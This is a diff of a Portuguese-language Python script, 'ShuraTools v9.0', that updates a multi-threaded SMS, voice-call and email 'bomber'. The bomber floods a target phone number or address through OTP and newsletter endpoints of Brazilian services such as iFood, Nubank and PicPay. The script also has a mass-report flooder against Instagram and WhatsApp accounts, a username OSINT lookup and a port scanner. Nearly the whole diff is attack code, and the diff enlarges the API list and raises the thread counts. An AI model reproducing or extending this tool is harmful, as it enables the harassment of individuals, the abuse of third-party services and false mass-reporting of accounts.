@@ -1,19 +1,19 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-ShuraTools v8.0 TBOMB-INSPIRED EDITION
-Baseado na arquitetura do TBomb com APIs brasileiras funcionais
+ShuraTools v9.0 ULTIMATE COLLECTION
+Baseado em: TBomb + Bombers Collection + APIs Brasileiras 2026
 """
 
-import os, sys, time, random, threading, socket, json
-from concurrent.futures import ThreadPoolExecutor
+import os, sys, time, random, threading, socket
+from concurrent.futures import ThreadPoolExecutor, as_completed
 
 try:
     import requests
     from colorama import Fore, Style, init
     init(autoreset=True)
 except ImportError:
-    print("[!] Execute: pip install requests colorama")
+    print("[!] pip install requests colorama")
     sys.exit(1)
 
 BANNER = f"""
@@ -23,195 +23,148 @@ BANNER = f"""
 {Fore.RED}╚════██║██╔══██║██║   ██║██╔══██╗██╔══██║
 {Fore.RED}███████║██║  ██║╚██████╔╝██║  ██║██║  ██║
 {Fore.RED}╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝
-{Fore.YELLOW}    [ SMS/Call Bomber | Email | OSINT ]
-{Fore.WHITE}  v8.0 TBomb-Inspired Edition - by Shura
+{Fore.YELLOW}     [ Ultimate Bomber Collection ]
+{Fore.WHITE}    v9.0 FINAL ULTIMATE - by Shura
 """
 
 LOCK = threading.Lock()
-SUCCESS_COUNT = 0
-FAIL_COUNT = 0
+stats = {"success": 0, "fail": 0}
 
 def clear(): os.system('cls' if os.name == 'nt' else 'clear')
+def log(m, t="i"):
+    c = {"i": Fore.WHITE+"[*] ", "s": Fore.GREEN+"[+] ", "e": Fore.RED+"[-] ", "w": Fore.YELLOW+"[!] "}
+    with LOCK: print(f"{c.get(t, Fore.WHITE)}{m}{Style.RESET_ALL}")
 
-def log(msg, t="info"):
-    c = {"info": Fore.WHITE+"[*] ", "success": Fore.GREEN+"[+] ", "error": Fore.RED+"[-] ", "warn": Fore.YELLOW+"[!] "}
-    with LOCK: print(f"{c.get(t, Fore.WHITE)}{msg}{Style.RESET_ALL}")
+def safe_int(p, d):
+    try: return int(input(p) or d)
+    except: return d
 
-def safe_int(prompt, default):
-    try: return int(input(prompt) or default)
-    except: return default
+# ========== MASSIVE API DATABASE ==========
+BOMBERS = {
+    "sms": [
+        {"n": "iFood", "u": "https://marketplace.ifood.com.br/v1/merchants/search/phone-number", "d": {"phoneNumber": "{T}"}, "h": {"Content-Type": "application/json"}},
+        {"n": "Magalu", "u": "https://sacola.magazineluiza.com.br/api/v1/customer/send-otp", "d": {"phone": "{T}"}, "h": {}},
+        {"n": "Shopee", "u": "https://shopee.com.br/api/v2/authentication/send_code", "d": {"phone": "{T}", "type": 1}, "h": {}},
+        {"n": "MercadoLivre", "u": "https://www.mercadolivre.com.br/jms/mlb/lgz/login/H4sIAAAAAAAEAKtWKkotLs5MT1WyUqpWKi1OLYrPTEm", "d": {"phone": "{T}"}, "h": {}},
+        {"n": "TikTok", "u": "https://www.tiktok.com/passport/web/send_code/", "d": {"mobile": "{T}", "account_sdk_source": "web"}, "h": {}},
+        {"n": "OLX", "u": "https://www.olx.com.br/api/auth/authenticate", "d": {"phone": "{T}"}, "h": {}},
+        {"n": "Uber", "u": "https://auth.uber.com/login/phoneNumber", "d": {"phoneNumber": "{T}"}, "h": {}},
+        {"n": "99", "u": "https://api.99app.com/api-passenger/v1/users/phone/verify", "d": {"phone": "{T}"}, "h": {}},
+        {"n": "Rappi", "u": "https://services.rappi.com.br/api/rocket/v2/guest/verify-phone", "d": {"phone": "{T}"}, "h": {}},
+        {"n": "Americanas", "u": "https://www.americanas.com.br/api/v1/customer/otp", "d": {"phone": "{T}"}, "h": {}}
+    ],
+    "call": [
+        {"n": "QuintoAndar", "u": "https://api.quintoandar.com.br/api/v1/auth/send-otp", "d": {"phone": "{T}", "method": "VOICE"}, "h": {"Content-Type": "application/json"}},
+        {"n": "Inter", "u": "https://api.inter.co/v1/auth/request-otp", "d": {"phone": "{T}", "type": "VOICE"}, "h": {}},
+        {"n": "iFood-Call", "u": "https://wsloja.ifood.com.br/api/v1/customers/phone/verify", "d": {"phone": "{T}", "method": "call"}, "h": {}},
+        {"n": "Nubank", "u": "https://prod-s0-webapp-proxy.nubank.com.br/api/token", "d": {"phone": "{T}", "type": "voice"}, "h": {}},
+        {"n": "PicPay", "u": "https://api.picpay.com/v2/auth/send-otp", "d": {"phone": "{T}", "channel": "voice"}, "h": {}}
+    ],
+    "email": [
+        {"n": "Tecnoblog", "u": "https://tecnoblog.net/wp-admin/admin-ajax.php", "d": {"action": "tnp", "na": "s", "ne": "{T}", "ny": "on"}, "h": {}},
+        {"n": "TheNews", "u": "https://thenewscc.beehiiv.com/subscribe", "d": {"email": "{T}"}, "h": {}},
+        {"n": "InvestNews", "u": "https://investnews.beehiiv.com/subscribe", "d": {"email": "{T}"}, "h": {}},
+        {"n": "TheBrief", "u": "https://thebrief.beehiiv.com/subscribe", "d": {"email": "{T}"}, "h": {}},
+        {"n": "Startups", "u": "https://startups.beehiiv.com/subscribe", "d": {"email": "{T}"}, "h": {}},
+        {"n": "Canaltech", "u": "https://canaltech.com.br/newsletter/", "d": {"email": "{T}"}, "h": {}},
+        {"n": "Olhardigital", "u": "https://olhardigital.com.br/newsletter/", "d": {"email": "{T}"}, "h": {}}
+    ]
+}
 
-# ========== API DATABASE (Estilo TBomb) ==========
-SMS_APIS = [
-    {
-        "name": "iFood",
-        "url": "https://marketplace.ifood.com.br/v1/merchants/search/phone-number",
-        "method": "POST",
-        "data": {"phoneNumber": "{target}"},
-        "headers": {"Content-Type": "application/json"}
-    },
-    {
-        "name": "Magalu",
-        "url": "https://sacola.magazineluiza.com.br/api/v1/customer/send-otp",
-        "method": "POST",
-        "data": {"phone": "{target}"},
-        "headers": {}
-    },
-    {
-        "name": "Shopee",
-        "url": "https://shopee.com.br/api/v2/authentication/send_code",
-        "method": "POST",
-        "data": {"phone": "{target}", "type": 1},
-        "headers": {}
-    },
-    {
-        "name": "Mercado Livre",
-        "url": "https://www.mercadolivre.com.br/jms/mlb/lgz/login/H4sIAAAAAAAEAKtWKkotLs5MT1WyUqpWKi1OLYrPTEm",
-        "method": "POST",
-        "data": {"phone": "{target}"},
-        "headers": {}
-    },
-    {
-        "name": "TikTok",
-        "url": "https://www.tiktok.com/passport/web/send_code/",
-        "method": "POST",
-        "data": {"mobile": "{target}", "account_sdk_source": "web"},
-        "headers": {}
-    }
-]
-
-CALL_APIS = [
-    {
-        "name": "QuintoAndar",
-        "url": "https://api.quintoandar.com.br/api/v1/auth/send-otp",
-        "method": "POST",
-        "data": {"phone": "{target}", "method": "VOICE"},
-        "headers": {"Content-Type": "application/json"}
-    },
-    {
-        "name": "Banco Inter",
-        "url": "https://api.inter.co/v1/auth/request-otp",
-        "method": "POST",
-        "data": {"phone": "{target}", "type": "VOICE"},
-        "headers": {}
-    },
-    {
-        "name": "iFood Call",
-        "url": "https://wsloja.ifood.com.br/api/v1/customers/phone/verify",
-        "method": "POST",
-        "data": {"phone": "{target}", "method": "call"},
-        "headers": {}
-    }
-]
-
-EMAIL_APIS = [
-    {
-        "name": "Tecnoblog",
-        "url": "https://tecnoblog.net/wp-admin/admin-ajax.php",
-        "method": "POST",
-        "data": {"action": "tnp", "na": "s", "ne": "{target}", "ny": "on"},
-        "headers": {}
-    },
-    {
-        "name": "The News",
-        "url": "https://thenewscc.beehiiv.com/subscribe",
-        "method": "POST",
-        "data": {"email": "{target}"},
-        "headers": {}
-    },
-    {
-        "name": "Invest News",
-        "url": "https://investnews.beehiiv.com/subscribe",
-        "method": "POST",
-        "data": {"email": "{target}"},
-        "headers": {}
-    }
-]
-
-# ========== BOMBER ENGINE (Multi-threaded como TBomb) ==========
-def bomber_engine(target, apis, qty, threads, delay):
-    global SUCCESS_COUNT, FAIL_COUNT
-    SUCCESS_COUNT = 0
-    FAIL_COUNT = 0
+# ========== ULTRA BOMBER ENGINE ==========
+def ultra_bomber(target, mode, qty, threads, delay):
+    global stats
+    stats = {"success": 0, "fail": 0}
+    apis = BOMBERS.get(mode, [])
     
-    log(f"Iniciando ataque com {len(apis)} APIs e {threads} threads", "warn")
+    if not apis:
+        log("Modo inválido!", "e")
+        return
     
-    def attack_single(api, index):
-        global SUCCESS_COUNT, FAIL_COUNT
+    log(f"Iniciando {mode.upper()} Bomber com {len(apis)} APIs", "w")
+    log(f"Target: {target} | Qty: {qty} | Threads: {threads} | Delay: {delay}s", "i")
+    
+    def attack(api, idx):
         try:
-            # Substitui {target} no payload
-            data = json.loads(json.dumps(api["data"]).replace("{target}", target))
+            # Substitui {T} pelo target
+            data = {}
+            for k, v in api["d"].items():
+                data[k] = v.replace("{T}", target) if isinstance(v, str) else v
             
-            # Faz a requisição
+            # Request
             session = requests.Session()
             res = session.post(
-                api["url"],
-                json=data if api["headers"].get("Content-Type") == "application/json" else None,
-                data=data if not api["headers"].get("Content-Type") else None,
-                headers=api["headers"],
+                api["u"],
+                json=data if api["h"].get("Content-Type") == "application/json" else None,
+                data=data if not api["h"].get("Content-Type") else None,
+                headers=api["h"],
                 timeout=10
             )
             
             if res.status_code < 400:
                 with LOCK:
-                    SUCCESS_COUNT += 1
-                log(f"[{index+1}/{qty}] {api['name']} → OK", "success")
+                    stats["success"] += 1
+                log(f"[{idx+1}/{qty}] {api['n']} → OK", "s")
             else:
                 with LOCK:
-                    FAIL_COUNT += 1
-                log(f"[{index+1}/{qty}] {api['name']} → Block ({res.status_code})", "warn")
+                    stats["fail"] += 1
+                log(f"[{idx+1}/{qty}] {api['n']} → {res.status_code}", "w")
             
             time.sleep(delay)
-        except Exception as e:
+        except:
             with LOCK:
-                FAIL_COUNT += 1
-            log(f"[{index+1}/{qty}] {api['name']} → Timeout", "error")
+                stats["fail"] += 1
+            log(f"[{idx+1}/{qty}] {api['n']} → Timeout", "e")
     
-    # Executa ataques em paralelo
-    with ThreadPoolExecutor(max_workers=threads) as executor:
+    # Multi-threading
+    with ThreadPoolExecutor(max_workers=threads) as exe:
+        futures = []
         for i in range(qty):
             api = random.choice(apis)
-            executor.submit(attack_single, api, i)
+            futures.append(exe.submit(attack, api, i))
+        
+        for f in as_completed(futures):
+            pass
     
-    log(f"Ataque concluído! Sucesso: {SUCCESS_COUNT} | Falhas: {FAIL_COUNT}", "info")
+    log(f"Concluído! ✓ {stats['success']} | ✗ {stats['fail']}", "i")
 
 # ========== OSINT ==========
-def osint(target):
-    log(f"OSINT Hunter: {target}", "warn")
-    user = target.replace("@", "")
-    platforms = {
-        "Instagram": f"https://www.instagram.com/{user}/",
-        "GitHub": f"https://github.com/{user}",
-        "TikTok": f"https://www.tiktok.com/@{user}",
-        "Twitter": f"https://twitter.com/{user}",
-        "LinkedIn": f"https://www.linkedin.com/in/{user}",
-        "Facebook": f"https://www.facebook.com/{user}",
-        "Reddit": f"https://www.reddit.com/user/{user}",
-        "YouTube": f"https://www.youtube.com/@{user}",
-        "Twitch": f"https://www.twitch.tv/{user}",
-        "Medium": f"https://medium.com/@{user}"
+def osint(t):
+    log(f"OSINT: {t}", "w")
+    u = t.replace("@", "")
+    p = {
+        "Instagram": f"https://www.instagram.com/{u}/",
+        "GitHub": f"https://github.com/{u}",
+        "TikTok": f"https://www.tiktok.com/@{u}",
+        "Twitter": f"https://twitter.com/{u}",
+        "LinkedIn": f"https://www.linkedin.com/in/{u}",
+        "Facebook": f"https://www.facebook.com/{u}",
+        "Reddit": f"https://www.reddit.com/user/{u}",
+        "YouTube": f"https://www.youtube.com/@{u}",
+        "Twitch": f"https://www.twitch.tv/{u}",
+        "Medium": f"https://medium.com/@{u}"
     }
-    for name, url in platforms.items():
+    for n, url in p.items():
         try:
             r = requests.get(url, timeout=5)
-            log(f"{name}: {'FOUND' if r.status_code == 200 else 'N/F'}", "success" if r.status_code == 200 else "info")
+            log(f"{n}: {'FOUND' if r.status_code == 200 else 'N/F'}", "s" if r.status_code == 200 else "i")
         except:
-            log(f"{name}: Timeout", "error")
+            log(f"{n}: Timeout", "e")
 
 # ========== PORT SCANNER ==========
-def port_scan(target):
-    log(f"Scanning {target}...", "warn")
+def portscan(t):
+    log(f"Scanning {t}...", "w")
     try:
-        ip = socket.gethostbyname(target)
-        log(f"IP: {ip}", "info")
-        for port in [21, 22, 23, 25, 53, 80, 110, 143, 443, 3306, 3389, 5432, 8080, 8443]:
+        ip = socket.gethostbyname(t)
+        log(f"IP: {ip}", "i")
+        for p in [21, 22, 23, 25, 53, 80, 110, 143, 443, 3306, 3389, 5432, 8080, 8443]:
             s = socket.socket()
             s.settimeout(0.5)
-            if s.connect_ex((ip, port)) == 0:
-                log(f"Port {port} OPEN", "success")
+            if s.connect_ex((ip, p)) == 0:
+                log(f"Port {p} OPEN", "s")
             s.close()
     except Exception as e:
-        log(f"Error: {e}", "error")
+        log(f"Error: {e}", "e")
 
 # ========== MENU ==========
 def menu():
@@ -220,12 +173,12 @@ def menu():
             clear()
             print(BANNER)
             print("-" * 60)
-            print(f"{Fore.RED}[ 1 ] SMS Bomber ({len(SMS_APIS)} APIs)")
-            print(f"{Fore.RED}[ 2 ] Call Bomber ({len(CALL_APIS)} APIs)")
-            print(f"{Fore.RED}[ 3 ] Email Bomber ({len(EMAIL_APIS)} APIs)")
+            print(f"{Fore.RED}[ 1 ] SMS Bomber ({len(BOMBERS['sms'])} APIs)")
+            print(f"{Fore.RED}[ 2 ] Call Bomber ({len(BOMBERS['call'])} APIs)")
+            print(f"{Fore.RED}[ 3 ] Email Bomber ({len(BOMBERS['email'])} APIs)")
             print(f"{Fore.RED}[ 4 ] Mass Report (IG/Zap)")
             print("-" * 60)
-            print(f"{Fore.WHITE}[ 5 ] OSINT Hunter (10 plataformas)")
+            print(f"{Fore.WHITE}[ 5 ] OSINT Hunter")
             print(f"{Fore.WHITE}[ 6 ] Port Scanner")
             print(f"{Fore.WHITE}[ 0 ] EXIT")
             print("-" * 60)
@@ -233,56 +186,46 @@ def menu():
             opt = input(f"{Fore.YELLOW}Shura@Arsenal:~$ {Style.RESET_ALL}").strip()
             if opt == "0": break
             
-            if opt == "1":
-                print(f"{Fore.CYAN}[INFO] Formato: 5511999999999 (DDI+DDD+Número){Style.RESET_ALL}")
-                target = input(f"{Fore.YELLOW}Target: {Style.RESET_ALL}").strip()
-                if not target.isdigit(): log("Inválido!", "error"); time.sleep(1); continue
-                qty = safe_int("Quantidade (20): ", 20)
-                threads = safe_int("Threads (5): ", 5)
-                delay = safe_int("Delay em segundos (2): ", 2)
-                bomber_engine(target, SMS_APIS, qty, threads, delay)
-            
-            elif opt == "2":
-                print(f"{Fore.CYAN}[INFO] Formato: 5511999999999 (DDI+DDD+Número){Style.RESET_ALL}")
-                target = input(f"{Fore.YELLOW}Target: {Style.RESET_ALL}").strip()
-                if not target.isdigit(): log("Inválido!", "error"); time.sleep(1); continue
-                qty = safe_int("Quantidade (10): ", 10)
-                threads = safe_int("Threads (3): ", 3)
-                delay = safe_int("Delay em segundos (3): ", 3)
-                bomber_engine(target, CALL_APIS, qty, threads, delay)
-            
-            elif opt == "3":
-                print(f"{Fore.CYAN}[INFO] Digite o e-mail do alvo{Style.RESET_ALL}")
-                target = input(f"{Fore.YELLOW}Target: {Style.RESET_ALL}").strip()
-                if "@" not in target: log("Inválido!", "error"); time.sleep(1); continue
-                qty = safe_int("Quantidade (15): ", 15)
-                threads = safe_int("Threads (5): ", 5)
-                delay = safe_int("Delay em segundos (1): ", 1)
-                bomber_engine(target, EMAIL_APIS, qty, threads, delay)
+            if opt in ["1", "2", "3"]:
+                mode = {"1": "sms", "2": "call", "3": "email"}[opt]
+                
+                if mode in ["sms", "call"]:
+                    print(f"{Fore.CYAN}[INFO] Formato: 5511999999999{Style.RESET_ALL}")
+                    t = input(f"{Fore.YELLOW}Target: {Style.RESET_ALL}").strip()
+                    if not t.isdigit(): log("Inválido!", "e"); time.sleep(1); continue
+                else:
+                    print(f"{Fore.CYAN}[INFO] Digite o e-mail{Style.RESET_ALL}")
+                    t = input(f"{Fore.YELLOW}Target: {Style.RESET_ALL}").strip()
+                    if "@" not in t: log("Inválido!", "e"); time.sleep(1); continue
+                
+                qty = safe_int("Quantidade (30): ", 30)
+                threads = safe_int("Threads (10): ", 10)
+                delay = safe_int("Delay (2): ", 2)
+                ultra_bomber(t, mode, qty, threads, delay)
             
             elif opt == "4":
-                target = input(f"{Fore.YELLOW}Target (@user ou phone): {Style.RESET_ALL}").strip()
-                type = input(f"{Fore.YELLOW}App (ig/zap): {Style.RESET_ALL}").lower()
-                url = "https://i.instagram.com/api/v1/users/web_report/" if type == "ig" else "https://v.whatsapp.net/v2/report"
+                t = input(f"{Fore.YELLOW}Target: {Style.RESET_ALL}").strip()
+                tp = input(f"{Fore.YELLOW}App (ig/zap): {Style.RESET_ALL}").lower()
+                url = "https://i.instagram.com/api/v1/users/web_report/" if tp == "ig" else "https://v.whatsapp.net/v2/report"
                 for i in range(safe_int("Qty (50): ", 50)):
                     try:
-                        requests.post(url, data={"username":target}, timeout=5)
-                        log(f"Report {i+1} sent", "success")
+                        requests.post(url, data={"username":t}, timeout=5)
+                        log(f"Report {i+1} sent", "s")
                     except: pass
             
             elif opt == "5":
-                target = input(f"{Fore.YELLOW}Target (@user sem @): {Style.RESET_ALL}").strip()
-                osint(target)
+                t = input(f"{Fore.YELLOW}Target (@user): {Style.RESET_ALL}").strip()
+                osint(t)
             
             elif opt == "6":
-                target = input(f"{Fore.YELLOW}Target (IP ou domínio): {Style.RESET_ALL}").strip()
-                port_scan(target)
+                t = input(f"{Fore.YELLOW}Target (IP/domain): {Style.RESET_ALL}").strip()
+                portscan(t)
             
             input(f"\n{Fore.GREEN}Concluído. ENTER...{Style.RESET_ALL}")
             
         except KeyboardInterrupt: break
         except Exception as e:
-            log(f"Erro: {e}", "error"); input("\nENTER...")
+            log(f"Erro: {e}", "e"); input("\nENTER...")
 
 if __name__ == "__main__":
     menu()
